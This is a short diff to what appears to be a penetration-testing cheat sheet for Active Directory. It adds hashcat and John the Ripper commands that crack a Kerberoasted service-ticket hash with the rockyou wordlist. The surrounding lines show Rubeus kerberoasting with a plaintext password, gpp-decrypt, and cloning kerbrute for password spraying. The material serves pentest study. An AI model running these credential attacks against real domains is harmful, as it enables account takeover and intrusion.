@@ -220,6 +220,7 @@ gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
 ### Password Spraying
 ```shell
 # -------------------- kerbrute.py --------------------
+
 git clone https://github.com/TarlogicSecurity/kerbrute.git
 cd kerbrute
 
@@ -430,8 +431,16 @@ hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
 # Using john to obtain the hash of jane
 ./Rubeus.exe kerberoast /domain:vorkharium.com /user:jane /creduser:vorkharium.com\john /credpassword:'Password123!' /nowrap
 
-# Cracking the hash
+# -------------------- Cracking the hash --------------------
+
+# With Hashcat
 hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt
+
+# With John
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
+sudo john jane_hash.txt --show
+
 ```
 ### AS-REP Roasting with Impacket
 ```shell
